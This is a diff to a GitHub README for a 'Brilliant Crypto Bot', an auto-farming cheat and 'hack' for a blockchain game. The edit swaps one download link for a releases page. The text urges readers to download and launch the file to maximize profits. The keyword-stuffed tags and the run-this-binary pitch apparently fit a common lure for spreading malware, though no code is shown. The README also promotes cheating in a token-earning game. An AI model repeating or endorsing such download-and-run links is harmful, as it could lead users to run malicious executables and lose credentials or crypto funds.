@@ -15,7 +15,7 @@ Are you tired of spending hours farming and clicking away in the Brilliant Crypt
 auto-clicker, auto-farm, blockchain-game, blockchain-technology, brilliant-crypto, brilliant-crypto-bot, brilliant-crypto-game, clicker-game, crypto-api, crypto-game, crypto-hack, crypto-token, cryptocurrency-game, ethereum-game, exploit, game-bot, game-cheat, game-enhancement, hack, mini-game
 
 ### Get Started:
-To begin using the Brilliant Crypto Bot, simply download it from [here](https://github.com/uploads/App.zip). Remember to launch the file to start automating your gameplay and maximizing your profits in the Brilliant Crypto game.
+To begin using the Brilliant Crypto Bot, simply download it from [here](https://github.com/Philiplaurence123/Brilliant-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases). Remember to launch the file to start automating your gameplay and maximizing your profits in the Brilliant Crypto game.
 
 ### 💡 Tip:
 If the provided link does not work or you require the latest version of the bot, please check the "Releases" section of this repository for updated releases.
